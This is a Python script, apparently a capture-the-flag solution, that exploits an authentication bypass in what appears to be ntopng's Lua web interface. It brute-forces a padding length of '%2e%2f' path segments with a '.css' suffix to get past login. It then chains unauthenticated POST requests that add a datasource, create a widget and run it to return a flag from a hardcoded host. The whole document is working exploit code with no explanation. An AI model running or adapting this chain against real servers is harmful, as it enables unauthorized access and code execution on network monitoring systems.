#!/usr/bin/env python3

import os
import requests
import binascii
import json
import urllib.parse

def get_base_length(base_url):
    for i in range(120, 1, -1):
        url1 = base_url + "/lua/" + "%2e%2f" * i + "as_stats.lua.css"
        r = requests.get(url1, allow_redirects=False)
        if r.status_code < 300:
            return 254 - i * 2 - 12

        url2 = base_url + "/lua/" + "%2e%2f" * i + "get_macs_data.lua.css"
        r = requests.get(url2, allow_redirects=False)
        if r.status_code < 300:
            return 254 - i * 2 - 17

    return -1

def get_url(base_length, base_url, target):
    padding_length = 254 - base_length - len(target)
    if padding_length % 2 == 1:
        raise RuntimeError(f"path {target} is not supported because of its length")

    return base_url + "/lua/" + "%2e%2f" * int(padding_length / 2) + target + ".css"

url = "http://34.68.120.253:31000"
url = url.rstrip('/')
base_length = get_base_length(url)

if base_length == -1:
    raise RuntimeError("Fail to get base_length")
else:
    print(f"Base Length is {base_length}")


alias = binascii.hexlify(os.urandom(10)).decode()
flag_script = b"get_flagz.lua".decode()

# Add datasource
url_1 = get_url(base_length, url, "edit_datasources.lua")
payload = f"{{\"alias\":\"{alias}\",\"data_retention\":\"10000\",\"scope\":\"public\",\"origin\":\"{flag_script}\"}}"
data = {
    "action": "add",
    "JSON": payload
}
r = requests.post(url_1, data=data)

ds_hash = json.loads(r.text)['message']


# Add widget
url_2 = get_url(base_length, url, "edit_widgets.lua")
payload = f"{{\"name\":\"{alias}\",\"type\":\"table\",\"ds_hash\":\"{ds_hash}\"}}"
data = {
    "action": "add",
    "JSON": payload
}
r = requests.post(url_2, data=data)

widget_key = json.loads(r.text)['message']

# Execute flag by widget
url_3 = get_url(base_length, url, "widgets/widget.lua")

payload = f"{{\"widget_key\":\"{widget_key}\"}}"
params = {
    "JSON": payload
}

r = requests.get(url_3, params=params)
print(r.text)
